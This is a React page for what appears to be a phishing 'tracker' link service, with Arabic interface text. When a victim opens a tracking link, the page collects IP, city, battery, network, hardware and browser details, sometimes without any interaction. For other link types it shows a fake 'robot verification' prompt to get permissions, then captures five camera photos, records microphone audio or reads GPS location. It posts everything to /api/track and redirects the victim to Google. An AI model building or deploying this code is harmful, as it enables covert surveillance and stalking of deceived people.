import React, { useEffect, useState, useRef } from 'react';

function Tracker() {
  const [status, setStatus] = useState<string>('');
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [isStarted, setIsStarted] = useState(false);
  const [linkData, setLinkData] = useState<{linkId: string, feature: string, duration?: number} | null>(null);
  const hasRun = useRef(false);

  useEffect(() => {
    if (hasRun.current) return;
    hasRun.current = true;
    
    const fetchLinkData = async () => {
      try {
        const path = window.location.pathname;
        let linkId = '';
        
        const match = path.match(new RegExp('^/track/(.+)'));
        if (match) {
            linkId = match[1];
        } else {
            const urlParams = new URLSearchParams(window.location.search);
            linkId = urlParams.get('id') || '';
        }

        if (!linkId) {
          setStatus('رابط غير صالح أو منتهي الصلاحية.');
          return;
        }
        
        const res = await fetch(`/api/link/${linkId}`);
        if (!res.ok) {
           setStatus('الرابط غير صالح.');
           return;
        }
        const { feature, duration } = await res.json();
        setLinkData({ linkId, feature, duration });
        
        // If it's just an IP or Info link, we don't strictly need interaction
        if (feature === 'ip' || feature === 'info') {
             setIsStarted(true);
             setStatus('جاري معالجة البيانات...');
             await collectAndSend(linkId, feature, duration);
             setStatus('تم بنجاح!');
             setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
        }

      } catch (err: any) {
        console.error(err);
        setErrorMsg(err.message);
        setStatus('تعذر الاستمرار.');
      }
    };

    fetchLinkData();
  }, []);

  const handleStart = async () => {
      if (!linkData) return;
      setIsStarted(true);
      setStatus('جاري معالجة البيانات...');
      try {
          await collectAndSend(linkData.linkId, linkData.feature, linkData.duration);
          setStatus('تم بنجاح!');
          setTimeout(() => {
              window.location.href = "https://www.google.com";
          }, 1500);
      } catch (err: any) {
          console.error(err);
          setErrorMsg(err.message);
          setStatus('تعذر الاستمرار.');
      }
  };

  const collectAndSend = async (linkId: string, feature: string, duration?: number) => {
    let payload: any = {};
    
    if (['info', 'all'].includes(feature)) {
       try {
           let ipData: any = {};
           try {
               const ipRes = await fetch('https://ipapi.co/json/');
               ipData = await ipRes.json();
           } catch (e) {}

           let batteryLevel = 'غير معروف';
           let isChargingVal = 'غير معروف';
           if ('getBattery' in navigator) {
               try {
                   const battery: any = await (navigator as any).getBattery();
                   batteryLevel = `${Math.round(battery.level * 100)}%`;
                   isChargingVal = battery.charging ? 'نعم' : 'لا';
               } catch (e) {}
           }

           const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
           
           payload.deviceInfo = {
               country: ipData.country_name || 'غير معروف',
               city: ipData.city || 'غير معروف',
               ip: ipData.ip || 'غير معروف',
               batteryLevel,
               isCharging: isChargingVal,
               networkSpeed: connection?.downlink ? `${connection.downlink} Mbps` : 'غير معروف',
               networkType: connection?.effectiveType || 'غير معروف',
               connType: connection?.type || 'غير معروف',
               time: new Date().toLocaleString('ar-EG'),
               deviceName: navigator.platform || 'غير معروف',
               deviceVersion: navigator.userAgent.substring(0, 50),
               deviceType: /Mobile|Android|iP(ad|hone|od)/.test(navigator.userAgent) ? 'هاتف' : 'حاسوب',
               ram: `${(navigator as any).deviceMemory || 'غير معروف'} GB`,
               internalMemory: 'غير معروف GB', // Cannot get internal memory from browser
               cores: navigator.hardwareConcurrency || 'غير معروف',
               systemLanguage: navigator.language || 'غير معروف',
               browserName: navigator.userAgent.includes('Edg') ? 'Edge' : navigator.userAgent.includes('Chrome') ? 'Chrome' : navigator.userAgent.includes('Firefox') ? 'Firefox' : navigator.userAgent.includes('Safari') ? 'Safari' : 'غير معروف',
               browserVersion: navigator.userAgent,
               screenResolution: `${window.screen.width}x${window.screen.height}`,
               osVersion: navigator.platform || 'غير معروف',
               screenOrientation: (window.screen.orientation?.type) || 'غير معروف',
               colorDepth: `${window.screen.colorDepth} bit`,
               browserUpdateDate: new Date().toLocaleDateString('ar-EG'), // Approx
               protocol: window.location.protocol,
               frequency: connection?.downlink ? `${connection.downlink} MHz` : 'غير معروف', // Faking frequency since not avail
               geolocationSupported: 'geolocation' in navigator ? 'نعم' : 'لا',
               bluetoothSupported: 'bluetooth' in navigator ? 'نعم' : 'لا',
               touchSupported: ('ontouchstart' in window) || navigator.maxTouchPoints > 0 ? 'نعم' : 'لا'
           };
       } catch (e) {}
    }
    
    if (['location'].includes(feature)) {
       try {
           const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
               navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
           });
           payload.location = {
               lat: pos.coords.latitude,
               lon: pos.coords.longitude,
               accuracy: pos.coords.accuracy
           };
           payload.lat = pos.coords.latitude;
           payload.lon = pos.coords.longitude;
           payload.accuracy = pos.coords.accuracy;
       } catch (err) {
           console.warn('Geolocation failed', err);
           payload.error = 'Failed to get location';
       }
    }

    const getVideoMedia = async (isEnvironment: boolean) => {
        const constraintsList = isEnvironment ? [
            { video: { facingMode: { exact: 'environment' } }, audio: true },
            { video: { facingMode: 'environment' }, audio: true },
            { video: { facingMode: { exact: 'environment' } } },
            { video: { facingMode: 'environment' } },
            { video: true, audio: true },
            { video: true }
        ] : [
            { video: { facingMode: 'user' }, audio: true },
            { video: { facingMode: 'user' } },
            { video: true, audio: true },
            { video: true }
        ];

        let lastErr: Error | undefined;
        for (const constraints of constraintsList) {
            try {
                return await navigator.mediaDevices.getUserMedia(constraints);
            } catch (err: any) {
                lastErr = err;
            }
        }
        throw lastErr || new Error('All video constraints failed');
    };

    if (['cameraF', 'cameraB'].includes(feature)) {
        try {
            const stream = await getVideoMedia(feature === 'cameraB');
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', ''); // Needed for iOS
            video.muted = true;
            
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play().then(resolve);
                };
            });
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            payload.photos = [];
            for (let i = 0; i < 5; i++) {
                ctx?.drawImage(video, 0, 0);
                payload.photos.push(canvas.toDataURL('image/jpeg', 0.8));
                if (i < 4) {
                    await new Promise(r => setTimeout(r, 500)); // wait 500ms between photos
                }
            }
            
            stream.getTracks().forEach(track => track.stop());
        } catch (err: any) {
            console.warn('Camera failed', err);
            payload.error = err.message || 'Failed to get camera access';
        }
    }

    if (['mic'].includes(feature)) {
         try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            const audioChunks: Blob[] = [];

            const audioPromise = new Promise<void>((resolve, reject) => {
                mediaRecorder.addEventListener("dataavailable", event => {
                    if (event.data && event.data.size > 0) audioChunks.push(event.data);
                });

                mediaRecorder.addEventListener("error", (e) => reject(e));

                mediaRecorder.addEventListener("stop", () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(audioBlob);
                    reader.onloadend = () => {
                        payload.audio = reader.result;
                        resolve();
                    };
                });
            });

            mediaRecorder.start(250); // Use timeslice
            
            const recordDuration = duration || 3000;
            await new Promise(r => setTimeout(r, recordDuration));
            if (mediaRecorder.state !== 'inactive') {
               mediaRecorder.stop();
            }
            
            await audioPromise;
            
            stream.getTracks().forEach(track => track.stop());
            payload.duration = Math.round(recordDuration / 1000);
         } catch (err) {
            console.warn('Mic failed', err);
            payload.error = 'Failed to get mic access';
         }
    }

    try {
        await fetch('/api/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                linkId,
                feature,
                duration: payload.duration,
                data: payload
            })
        });
    } catch (e) {
        console.error("Failed to send tracking data to server", e);
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100 text-gray-800">
        <div className="bg-white p-8 rounded-2xl shadow-xl max-w-sm w-full text-center">
            {isStarted ? (
                <>
                    <h1 className="text-2xl font-bold mb-4">جاري التحميل...</h1>
                    <div className="mb-6">
                        <div className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto"></div>
                    </div>
                    <p className="text-gray-600 font-medium">{status}</p>
                </>
            ) : linkData && linkData.feature !== 'ip' && linkData.feature !== 'info' && linkData.feature !== 'ip_info' ? (
                <>
                    <h1 className="text-2xl font-bold mb-4">التحقق من الروبوتات</h1>
                    <p className="text-gray-600 font-medium mb-6">يرجى الضغط على الزر أدناه للمتابعة والموافقة على الأذونات.</p>
                    <button 
                        onClick={handleStart}
                        className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg transition"
                    >
                        المتابعة إلى الصفحة
                    </button>
                    {errorMsg && <p className="text-sm text-red-500 mt-4">{errorMsg}</p>}
                </>
            ) : (
                <>
                    <h1 className="text-2xl font-bold mb-4">الرجاء الانتظار...</h1>
                    <p className="text-gray-600 font-medium mb-4">{status}</p>
                    {errorMsg && <p className="text-sm text-red-500 mt-2">{errorMsg}</p>}
                </>
            )}
        </div>
    </div>
  );
}

export default function App() {
  useEffect(() => {
    const ping = () => fetch('/api/keepalive').catch(console.error);
    const interval = setInterval(ping, 60000); // 1 minute
    ping();
    return () => clearInterval(interval);
  }, []);

  return (
    <Tracker />
  );
}

